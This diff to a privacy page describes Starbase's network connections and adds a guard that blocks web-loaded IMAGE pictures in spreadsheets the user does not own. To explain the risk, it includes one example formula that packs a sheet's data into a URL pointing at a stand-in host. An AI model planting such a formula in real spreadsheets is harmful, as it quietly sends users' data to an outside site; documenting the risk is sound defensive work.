@@ -11,6 +11,7 @@ below happens only when you (or whoever runs your Starbase server) set it up or 
 | Connect to a server | Desktop: Docs, Sheets, Drive | Only after you choose **Connect to a server…** and type an address | The Starbase server you typed in | Your device sign-in token and the files you open or save there |
 | Signing in with your own login service (OIDC) | Server | Only when its operator sets `STARBASE_OIDC_*` (see the [Docker guide](install/docker.md)) | The login service the operator named | The standard sign-in requests: discovery, token exchange, key fetch |
 | Update check | Desktop: Docs, Sheets, Drive | Only when you turn it on (Docs: **Help › Check for updates**; Sheets and Drive: **File › Settings › Check for updates when Starbase starts**), or each time you click **Check for updates now** | GitHub's API: `api.github.com/repos/DomeShifter/Starbase/releases` (Starbase's own releases, never WordCraft's or GridCraft's) | An ordinary web request: no files and no personal data, only what any web request carries, such as your IP address. [GitHub's privacy statement](https://docs.github.com/site-policy/privacy-policies/github-general-privacy-statement) |
+| Pictures from web addresses (`=IMAGE("https://…")`) | Web: Sheets | When a spreadsheet with an IMAGE formula is open: at once in your own spreadsheets; in any other spreadsheet only after you press **Allow** (see [External content](#external-content-in-spreadsheets)) | The address in the formula | A normal browser request for that address, including anything the formula put in it |
 
 The update check is **off** on a new install. Turning it on in one Starbase desktop program
 turns it on for all of them on that computer (the setting is kept in `updates.json` in
@@ -21,13 +22,32 @@ say-so.
 ## What never connects out
 
 - **The web apps** (Sheets, Docs and Drive in a browser) talk only to the Starbase server that
-  served them. They never check for updates: the server, and its Docker image, are updated by
+  served them, apart from IMAGE pictures (above). They never check for updates: the server, and its Docker image, are updated by
   the person who runs it.
 - **The server** stores your files on the machine it runs on. It contacts other systems only
   when its operator sets that up (a login service, as above; backups go to a folder the
   operator chooses).
 - **Spelling and language data** are built into the programs; nothing is downloaded. (The
   language-pack downloader in the WordCraft engine is not switched on in Starbase.)
+
+## External content in spreadsheets
+
+A formula can build a web address out of a sheet's data, for example
+`=IMAGE("https://example.com/?"&TEXTJOIN(",",1,A1:Z99))`. Loading that picture would send the
+data to that site. So, as in Excel and Google Sheets, StarSheets blocks such requests in any
+spreadsheet that isn't yours until you agree:
+
+- **Your own spreadsheets** (ones you made in Starbase, in your own folder, last changed by you)
+  load web pictures as before.
+- **Any other spreadsheet** (shared with you by someone else, uploaded or opened from a file, or
+  a copy of one of those) loads nothing from the web. Each IMAGE cell shows a grey "blocked"
+  picture, and a slim bar under the toolbar says **External content is blocked · Allow**.
+- **Allow** loads the pictures and is remembered for you and that file on the server (in your
+  personal settings, next to your starred files). A file not yet saved to the server is allowed
+  for that tab only; the choice moves with it when it is saved.
+- Only IMAGE reaches the web today. IMPORTDATA, IMPORTHTML, IMPORTXML, IMPORTFEED, IMPORTRANGE
+  and WEBSERVICE aren't built yet; when they are, they go through the same guard.
+- The desktop app doesn't load web pictures at all yet.
 
 ## Connections that stay on your own computer
 
